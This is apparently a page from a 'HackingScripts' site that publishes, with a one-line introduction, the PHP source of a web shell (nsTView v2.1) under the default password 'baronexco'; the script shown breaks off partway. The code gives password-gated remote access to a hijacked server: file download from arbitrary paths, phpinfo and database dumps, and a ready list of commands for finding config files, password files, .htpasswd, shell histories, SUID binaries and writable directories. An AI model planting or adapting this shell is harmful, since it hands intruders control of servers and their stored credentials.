<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> Baronexco shell </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>Baronexco shell</h2>
<p class="meta">11 Feb 2014</p>

<p>I don&#8217;t know what this script is called, but the default password seems to be &#8216;baronexco&#8217;, so that&#8217;s the name I&#8217;ve give it.</p>

<h3>Baronexco Shell Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>
<span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
<span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="o">@</span><span class="nb">set_magic_quotes_runtime</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span> <span class="o">&amp;</span> <span class="o">~</span><span class="nx">E_NOTICE</span><span class="p">);</span>

<span class="c1">###</span>
<span class="c1">####cfg</span>
<span class="c1">###</span>
<span class="c1">####</span>
<span class="c1"># use password  true / false #</span>
<span class="nv">$create_password</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="nv">$password</span> <span class="o">=</span> <span class="s2">&quot;baronexco&quot;</span><span class="p">;</span>    <span class="c1">// default password for nstview, you can change it.</span>

<span class="c1"># UNIX COMMANDS</span>
<span class="c1"># description (nst) command</span>
<span class="c1"># example: Shutdown (nst) shutdown -h now</span>
<span class="nv">$fast_commands</span> <span class="o">=</span> <span class="s2">&quot;</span>
<span class="s2">Show open ports (nst) netstat -an | grep LISTEN | grep tcp</span>
<span class="s2">last root (nst) last root</span>
<span class="s2">last (all users) (nst) last all</span>
<span class="s2">Find all config.php in / (nst) find / -type f -name config.php</span>
<span class="s2">Find all config.php in . (nst) find . -type f -name config.php</span>
<span class="s2">Find all admin.php in / (nst) find / -type f -name admin.php</span>
<span class="s2">Find all admin.php in . (nst) find . -type f -name admin.php</span>
<span class="s2">Find all config.inc.php in / (nst) find / -type f -name config.inc.php</span>
<span class="s2">Find all config.inc.php in . (nst) find . -type f -name config.inc.php</span>
<span class="s2">Find all config.inc in / (nst) find / -type f -name config.inc</span>
<span class="s2">Find all config.inc in . (nst) find . -type f -name config.inc</span>
<span class="s2">Find all config.dat in / (nst) find / -type f -name config.dat</span>
<span class="s2">Find all config.dat in . (nst) find . -type f -name config.dat</span>
<span class="s2">Find all config* in / (nst) find / -type f -name config*</span>
<span class="s2">Find all config* in . (nst) find . -type f -name config*</span>
<span class="s2">Find all pass* in / (nst) find / -type f -name pass*</span>
<span class="s2">Find all pass* in . (nst) find . -type f -name pass*</span>
<span class="s2">Find all .bash_history in / (nst) find / -type f -name .bash_history</span>
<span class="s2">Find all .bash_history in . (nst) find . -type f -name .bash_history</span>
<span class="s2">Find all .htpasswd  in / (nst) find / -type f -name .htpasswd</span>
<span class="s2">Find all .htpasswd  in . (nst) find . -type f -name .htpasswd</span>
<span class="s2">Find all writable dirs/files in / (nst) find / -perm -2 -ls</span>
<span class="s2">Find all writable dirs/files in . (nst) find . -perm -2 -ls</span>
<span class="s2">Find all suid files in / (nst) find / -type f -perm -04000 -ls</span>
<span class="s2">Find all suid files in . (nst) find . -type f -perm -04000 -ls</span>
<span class="s2">Find all sgid files in / (nst) find / -type f -perm -02000 -ls</span>
<span class="s2">Find all sgid files in . (nst) find . -type f -perm -02000 -ls</span>
<span class="s2">Find all .fetchmailrc files in / (nst) find / -type f -name .fetchmailrc</span>
<span class="s2">Find all .fetchmailrc files in . (nst) find . -type f -name .fetchmailrc</span>
<span class="s2">OS Version? (nst) sysctl -a | grep version</span>
<span class="s2">Kernel version? (nst) cat /proc/version</span>
<span class="s2">cat syslog.conf (nst) cat /etc/syslog.conf</span>
<span class="s2">Cat - Message of the day (nst) cat /etc/motd</span>
<span class="s2">Cat hosts (nst) cat /etc/hosts</span>
<span class="s2">Distrib name (nst) cat /etc/issue.net</span>
<span class="s2">Distrib name (2) (nst) cat /etc/*-realise</span>
<span class="s2">Display all process - wide output (nst) ps auxw</span>
<span class="s2">Display all your process (nst) ps ux</span>
<span class="s2">Interfaces (nst) ifconfig</span>
<span class="s2">CPU? (nst) cat /proc/cpuinfo</span>
<span class="s2">RAM (nst) free -m</span>
<span class="s2">HDD space (nst) df -h</span>
<span class="s2">List of Attributes (nst) lsattr -a</span>
<span class="s2">Mount options (nst) cat /etc/fstab</span>
<span class="s2">Is cURL installed? (nst) which curl</span>
<span class="s2">Is wGET installed? (nst) which wget</span>
<span class="s2">Is lynx installed? (nst) which lynx</span>
<span class="s2">Is links installed? (nst) which links</span>
<span class="s2">Is fetch installed? (nst) which fetch</span>
<span class="s2">Is GET installed? (nst) which GET</span>
<span class="s2">Is perl installed? (nst) which perl</span>
<span class="s2">Where is apache (nst) whereis apache</span>
<span class="s2">Where is perl (nst) whereis perl</span>
<span class="s2">locate proftpd.conf (nst) locate proftpd.conf</span>
<span class="s2">locate httpd.conf (nst) locate httpd.conf</span>
<span class="s2">locate my.conf (nst) locate my.conf</span>
<span class="s2">locate psybnc.conf (nst) locate psybnc.conf</span>
<span class="s2">&quot;</span><span class="p">;</span>



<span class="c1"># WINDOWS COMMANDS</span>
<span class="c1"># description (nst) command</span>
<span class="c1"># example: Delete autoexec.bat (nst) del c:\autoexec.bat</span>
<span class="nv">$fast_commands_win</span> <span class="o">=</span> <span class="s2">&quot;</span>
<span class="s2">OS Version (nst) ver</span>
<span class="s2">Tasklist  (nst) tasklist</span>
<span class="s2">Attributes in . (nst) attrib</span>
<span class="s2">Show open ports (nst) netstat -an</span>
<span class="s2">&quot;</span><span class="p">;</span>






<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###ver</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="nv">$ver</span><span class="o">=</span> <span class="s2">&quot;v2.1&quot;</span><span class="p">;</span>

<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">###</span>
<span class="c1">####</span>
<span class="nv">$pass</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$pass</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;nst&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">$pass</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_CLIENT_IP&quot;</span><span class="p">])</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_CLIENT_IP&quot;</span><span class="p">];</span>
<span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_X_FORWARDED_FOR&quot;</span><span class="p">])</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_X_FORWARDED_FOR&quot;</span><span class="p">];</span>
<span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">])</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">];</span>
<span class="k">else</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
<span class="nv">$ip</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$ip</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$create_password</span><span class="o">==</span><span class="k">true</span><span class="p">){</span>

<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;nst&#39;</span><span class="p">])</span> <span class="k">or</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;nst&#39;</span><span class="p">]</span><span class="o">!=</span><span class="nv">$password</span><span class="p">){</span>
<span class="k">die</span><span class="p">(</span><span class="s2">&quot;</span>
<span class="s2">&amp;lt;title&amp;gt;nsTView </span><span class="si">$ver</span><span class="s2">:: nst.void.ru&amp;lt;/title&amp;gt;</span>
<span class="s2">&amp;lt;center&amp;gt;</span>
<span class="s2">&amp;lt;table width=100 bgcolor=#D7FFA8 border=1 bordercolor=black&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;</span>
<span class="s2">&amp;lt;font size=1 face=verdana&amp;gt;&amp;lt;center&amp;gt;</span>
<span class="s2">&amp;lt;b&amp;gt;nsTView </span><span class="si">$ver</span><span class="s2"> :: &amp;lt;a href=http://nst.void.ru style=&#39;text-decoration:none;&#39;&amp;gt;&amp;lt;font color=black&amp;gt;nst.void.ru&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/b&amp;gt;</span>
<span class="s2">&amp;lt;/center&amp;gt;</span>
<span class="s2">&amp;lt;form method=post&amp;gt;</span>
<span class="s2">Password:&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=password name=pass size=30 tabindex=1&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;</span>
<span class="s2">&amp;lt;b&amp;gt;Host:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;b&amp;gt;IP:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;b&amp;gt;Your ip:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">);}</span>

<span class="p">}</span>
<span class="nv">$d</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">];</span>

<span class="k">function</span> <span class="nf">adds</span><span class="p">(</span><span class="nv">$editf</span><span class="p">){</span>
<span class="c1">#if(get_magic_quotes_gpc()==0){</span>
<span class="nv">$editf</span><span class="o">=</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$editf</span><span class="p">);</span>
<span class="c1">#}</span>
<span class="k">return</span> <span class="nv">$editf</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">adds2</span><span class="p">(</span><span class="nv">$editf</span><span class="p">){</span>
<span class="k">if</span><span class="p">(</span><span class="nb">get_magic_quotes_gpc</span><span class="p">()</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
<span class="nv">$editf</span><span class="o">=</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$editf</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">return</span> <span class="nv">$editf</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$f</span>   <span class="o">=</span> <span class="s2">&quot;nst_sql.txt&quot;</span><span class="p">;</span>
<span class="nv">$f_d</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f_d&#39;</span><span class="p">];</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;download&#39;</span><span class="p">]){</span>
<span class="nv">$download</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;download&#39;</span><span class="p">];</span>
<span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="si">$download\</span><span class="s2">&quot;</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="s2">readfile(&quot;</span><span class="nv">$d</span><span class="o">/</span><span class="nv">$download</span><span class="s2">&quot;);</span>
<span class="s2">exit;}</span>

<span class="s2">if(</span><span class="si">$_GET[&#39;dump_download&#39;]</span><span class="s2">){</span>
<span class="s2">header(&quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">disposition</span><span class="o">:</span> <span class="nx">attachment</span><span class="p">;</span> <span class="nx">filename</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$f\</span><span class="s2">&quot;</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="s2">header(&quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">length</span><span class="o">:</span> <span class="s2">&quot;.filesize(</span><span class="si">$f_d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$f</span><span class="s2">));</span>
<span class="s2">header(&quot;</span><span class="nx">Expires</span><span class="o">:</span> <span class="mi">0</span><span class="s2">&quot;);</span>
<span class="s2">readfile(</span><span class="si">$f_d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$f</span><span class="s2">);</span>
<span class="s2">if(is_writable(</span><span class="si">$f_d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$f</span><span class="s2">)){</span>
<span class="s2">unlink(</span><span class="si">$f_d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$f</span><span class="s2">);</span>
<span class="s2">}</span>
<span class="s2">die;</span>
<span class="s2">}</span>


<span class="si">$images</span><span class="s2">=array(&quot;</span><span class="o">.</span><span class="nx">gif</span><span class="s2">&quot;,&quot;</span><span class="o">.</span><span class="nx">jpg</span><span class="s2">&quot;,&quot;</span><span class="o">.</span><span class="nx">png</span><span class="s2">&quot;,&quot;</span><span class="o">.</span><span class="nx">bmp</span><span class="s2">&quot;,&quot;</span><span class="o">.</span><span class="nx">jpeg</span><span class="s2">&quot;);</span>
<span class="si">$whereme</span><span class="s2">=getcwd();</span>
<span class="s2">@</span><span class="si">$d</span><span class="s2">=@</span><span class="si">$_GET[&#39;d&#39;]</span><span class="s2">;</span>
<span class="si">$copyr</span><span class="s2"> = &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">center</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="nx">http</span><span class="o">://</span><span class="nx">nst</span><span class="o">.</span><span class="nx">void</span><span class="o">.</span><span class="nx">ru</span> <span class="nx">target</span><span class="o">=</span><span class="nx">_blank</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">nsTView</span> <span class="nv">$ver</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">o</span><span class="o">...</span> <span class="nx">Network</span> <span class="nx">security</span> <span class="nx">team</span> <span class="o">...</span><span class="nx">o</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="si">$php_self</span><span class="s2">=@</span><span class="si">$_SERVER[&#39;PHP_SELF&#39;]</span><span class="s2">;</span>
<span class="s2">if(@eregi(&quot;</span><span class="o">/</span><span class="s2">&quot;,</span><span class="si">$whereme</span><span class="s2">))</span><span class="si">{</span><span class="nv">$os</span><span class="o">=</span><span class="s2">&quot;unix&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2">else</span><span class="si">{</span><span class="nv">$os</span><span class="o">=</span><span class="s2">&quot;win&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">if(!isset(</span><span class="si">$d</span><span class="s2">))</span><span class="si">{</span><span class="nv">$d</span><span class="o">=</span><span class="nv">$whereme</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="si">$d</span><span class="s2">=str_replace(&quot;</span><span class="nx">\\</span><span class="s2">&quot;,&quot;</span><span class="o">/</span><span class="s2">&quot;,</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2">if(@</span><span class="si">$_GET[&#39;p&#39;]</span><span class="s2">==&quot;</span><span class="nx">info</span><span class="s2">&quot;){</span>
<span class="s2">@phpinfo();</span>
<span class="s2">exit;}</span>
<span class="s2">if(@</span><span class="si">$_GET[&#39;img&#39;]</span><span class="s2">==&quot;</span><span class="mi">1</span><span class="s2">&quot;){</span>
<span class="s2">@</span><span class="si">$e</span><span class="s2">=</span><span class="si">$_GET[&#39;e&#39;]</span><span class="s2">;</span>
<span class="s2">header(&quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">type</span><span class="o">:</span> <span class="nx">image</span><span class="o">/</span><span class="nx">gif</span><span class="s2">&quot;);</span>
<span class="s2">readfile(&quot;</span><span class="nv">$d</span><span class="o">/</span><span class="nv">$e</span><span class="s2">&quot;);</span>
<span class="s2">}</span>
<span class="s2">if(@</span><span class="si">$_GET[&#39;getdb&#39;]</span><span class="s2">==&quot;</span><span class="mi">1</span><span class="s2">&quot;){</span>
<span class="s2">header(&#39;Content-type: application/plain-text&#39;);</span>
<span class="s2">header(&#39;Content-Disposition: attachment; filename=nst-mysql-damp.htm&#39;);</span>
<span class="s2">}</span>
<span class="s2">print &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">title</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">nsT</span> <span class="nx">View</span> <span class="nv">$ver</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">title</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">style</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="nx">BODY</span><span class="p">,</span> <span class="nx">TD</span><span class="p">,</span> <span class="nx">TR</span> <span class="p">{</span>
<span class="nx">text</span><span class="o">-</span><span class="nx">decoration</span><span class="o">:</span> <span class="nx">none</span><span class="p">;</span>
<span class="nx">font</span><span class="o">-</span><span class="nx">family</span><span class="o">:</span> <span class="nx">Verdana</span><span class="p">;</span>
<span class="nx">font</span><span class="o">-</span><span class="nx">size</span><span class="o">:</span> <span class="mi">8</span><span class="nx">pt</span><span class="p">;</span>
<span class="nx">SCROLLBAR</span><span class="o">-</span><span class="nx">FACE</span><span class="o">-</span><span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#363d4e;</span>
<span class="nx">SCROLLBAR</span><span class="o">-</span><span class="nx">HIGHLIGHT</span><span class="o">-</span><span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#363d4e;</span>
<span class="nx">SCROLLBAR</span><span class="o">-</span><span class="nx">SHADOW</span><span class="o">-</span><span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#363d4e;</span>
<span class="nx">SCROLLBAR</span><span class="o">-</span><span class="nx">ARROW</span><span class="o">-</span><span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#363d4e;</span>
<span class="nx">SCROLLBAR</span><span class="o">-</span><span class="nx">TRACK</span><span class="o">-</span><span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#91AAFF</span>
<span class="p">}</span>
<span class="nx">input</span><span class="p">,</span> <span class="nx">textarea</span><span class="p">,</span> <span class="nx">select</span> <span class="p">{</span>
<span class="nx">font</span><span class="o">-</span><span class="nx">family</span><span class="o">:</span> <span class="nx">Verdana</span><span class="p">;</span>
<span class="nx">font</span><span class="o">-</span><span class="nx">size</span><span class="o">:</span> <span class="mi">10</span><span class="nx">px</span><span class="p">;</span>
<span class="nx">color</span><span class="o">:</span> <span class="nx">black</span><span class="p">;</span>
<span class="nx">background</span><span class="o">-</span><span class="nx">color</span><span class="o">:</span> <span class="nx">white</span><span class="p">;</span>
<span class="nx">border</span><span class="o">:</span> <span class="nx">solid</span> <span class="mi">1</span><span class="nx">px</span><span class="p">;</span>
<span class="nx">border</span><span class="o">-</span><span class="nx">color</span><span class="o">:</span> <span class="nx">black</span>
<span class="p">}</span>
<span class="nx">UNKNOWN</span> <span class="p">{</span>
<span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#0006DE;</span>
<span class="nx">TEXT</span><span class="o">-</span><span class="nx">DECORATION</span><span class="o">:</span> <span class="nx">none</span>
<span class="p">}</span>
<span class="nx">A</span><span class="o">:</span><span class="nb">link</span> <span class="p">{</span>
<span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#0006DE;</span>
<span class="nx">TEXT</span><span class="o">-</span><span class="nx">DECORATION</span><span class="o">:</span> <span class="nx">none</span>
<span class="p">}</span>
<span class="nx">A</span><span class="o">:</span><span class="nx">hover</span> <span class="p">{</span>
<span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#FF0C0B;</span>
<span class="nx">TEXT</span><span class="o">-</span><span class="nx">DECORATION</span><span class="o">:</span> <span class="nx">none</span>
<span class="p">}</span>
<span class="nx">A</span><span class="o">:</span><span class="nx">active</span> <span class="p">{</span>
<span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#0006DE;</span>
<span class="nx">TEXT</span><span class="o">-</span><span class="nx">DECORATION</span><span class="o">:</span> <span class="nx">none</span>
<span class="p">}</span>
<span class="nx">A</span><span class="o">:</span><span class="nx">visited</span> <span class="p">{</span>
<span class="nx">TEXT</span><span class="o">-</span><span class="nx">DECORATION</span><span class="o">:</span> <span class="nx">none</span>
<span class="p">}</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">style</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">script</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="k">function</span> <span class="nf">ShowOrHide</span><span class="p">(</span><span class="nx">d1</span><span class="p">,</span> <span class="nx">d2</span><span class="p">)</span> <span class="p">{</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">d1</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="nx">DoDiv</span><span class="p">(</span><span class="nx">d1</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">d2</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="nx">DoDiv</span><span class="p">(</span><span class="nx">d2</span><span class="p">);}</span>

<span class="k">function</span> <span class="nf">DoDiv</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
<span class="k">var</span> <span class="nx">item</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nx">getElementById</span><span class="p">)</span> <span class="p">{</span>
<span class="nx">item</span> <span class="o">=</span> <span class="nx">document</span><span class="o">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nx">all</span><span class="p">){</span>
<span class="nx">item</span> <span class="o">=</span> <span class="nx">document</span><span class="o">.</span><span class="nx">all</span><span class="p">[</span><span class="nx">id</span><span class="p">];</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nx">layers</span><span class="p">){</span>
<span class="nx">item</span> <span class="o">=</span> <span class="nx">document</span><span class="o">.</span><span class="nx">layers</span><span class="p">[</span><span class="nx">id</span><span class="p">];}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">item</span><span class="p">)</span> <span class="p">{}</span>
<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">item</span><span class="o">.</span><span class="nx">style</span><span class="p">)</span> <span class="p">{</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">item</span><span class="o">.</span><span class="nx">style</span><span class="o">.</span><span class="nx">display</span> <span class="o">==</span> <span class="nx">\</span><span class="s2">&quot;none</span><span class="se">\&quot;</span><span class="s2">){ item.style.display = </span><span class="se">\&quot;\&quot;</span><span class="s2">; }</span>
<span class="s2">else {item.style.display = </span><span class="se">\&quot;</span><span class="s2">none</span><span class="se">\&quot;</span><span class="s2">; }</span>
<span class="s2">}else{ item.visibility = </span><span class="se">\&quot;</span><span class="s2">show</span><span class="se">\&quot;</span><span class="s2">; }}</span>

<span class="s2">function cwd(text){</span>
<span class="s2">document.sh311Form.sh3.value+=</span><span class="se">\&quot;</span><span class="s2"> </span><span class="se">\&quot;</span><span class="s2">+ text;</span>
<span class="s2">document.sh311Form.sh3.focus();</span>
<span class="s2">}</span>


<span class="s2">&amp;lt;/script&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;body vlink=#0006DE&amp;gt;</span>
<span class="s2">&amp;lt;table width=600 border=0 cellpadding=0 cellspacing=1 bgcolor=#D7FFA8 align=center&amp;gt;</span>
<span class="s2">&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;font face=wingdings size=2&amp;gt;0&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
<span class="nv">$expl</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
<span class="nv">$coun</span><span class="o">=</span><span class="nb">count</span><span class="p">(</span><span class="nv">$expl</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;unix&quot;</span><span class="p">){</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=/&#39;&amp;gt;/&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">else</span><span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$expl[0]</span><span class="s2">&#39;&amp;gt;</span><span class="si">$expl[0]</span><span class="s2">/&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$coun</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
        <span class="o">@</span><span class="nv">$xx</span><span class="o">.=</span><span class="nv">$expl</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="p">;</span>
<span class="nv">$sls</span><span class="o">=</span><span class="s2">&quot;&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$expl[0]</span><span class="s2">/</span><span class="si">$xx</span><span class="s2">&#39;&amp;gt;</span><span class="si">$expl[$i]</span><span class="s2">&amp;lt;/a&amp;gt;/&quot;</span><span class="p">;</span>
<span class="nv">$sls</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$sls</span><span class="p">);</span>
<span class="nv">$sls</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;/&#39;&amp;gt;&amp;lt;/a&amp;gt;/&quot;</span><span class="p">,</span><span class="s2">&quot;/&#39;&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$sls</span><span class="p">);</span>
<span class="k">print</span> <span class="nv">$sls</span><span class="p">;</span>
<span class="p">}</span>
